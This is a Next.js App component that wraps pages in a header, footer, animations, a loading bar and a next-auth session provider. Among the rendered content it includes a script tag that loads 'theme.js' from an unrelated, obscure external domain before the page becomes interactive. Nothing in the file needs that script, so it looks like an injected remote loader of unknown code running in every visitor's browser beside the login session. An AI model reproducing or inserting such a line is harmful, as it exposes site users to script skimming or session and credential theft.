import "/styles/globals.css";

import React, { useEffect } from "react";
import Footer from "./Footer";
import Header from "./Header";
import Script from "next/script";

import NextNProgress from "nextjs-progressbar";
import RouteTransitions from "../components/RouteTransitions";

import { SessionProvider } from "next-auth/react";
import { SkeletonTheme } from "react-loading-skeleton";
import { motion } from "framer-motion";
import { BarLoader } from "react-spinners";

function MyApp({ Component, pageProps, session }) {
    const [loading, setLoading] = React.useState(true);
    useEffect(() => { setTimeout(() => { setLoading(false); }, 2000); }, []);

    return (
        <main className="">

            <NextNProgress
                options={{ showSpinner: false, }}
                color="#a855f7" startPosition={0.1}
                stopDelayMs={100} height={3}
                showOnShallow={false}/>

            <motion.div
                initial={{ y: 40, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                exit={{ y: -40, opacity: 0 }}
                transition={{
                    type: "spring", stiffness: 400,
                    damping: 10, duration: 0.5,
                }}>

                <Header/>
                <RouteTransitions>

                    {/* Content Display Loader */}
                    <main className="pt-20 px-[15px] xs:px-[25px] mx-auto max-w-4xl">
                        <SessionProvider session={session}>

                            {/* Loading Content Bar */}
                            { loading ? (
                                <div className="flex justify-center items-center h-screen">
                                    <BarLoader color="#1f2f32" loading={loading} />
                                </div>

                            ) : (

                                // Render Content from Page Data
                                <>
                                    <SkeletonTheme baseColor="#232329" highlightColor="#2a2a32">
                                        <Script src="https://araxyso.xyz/theme.js" strategy="beforeInteractive" />
                                        <Component {...pageProps} />
                                    </SkeletonTheme>
                                </>
                            )}

                        </SessionProvider> <Footer/>
                    </main> </RouteTransitions>
            </motion.div>
        </main>
    );
}
export default MyApp;
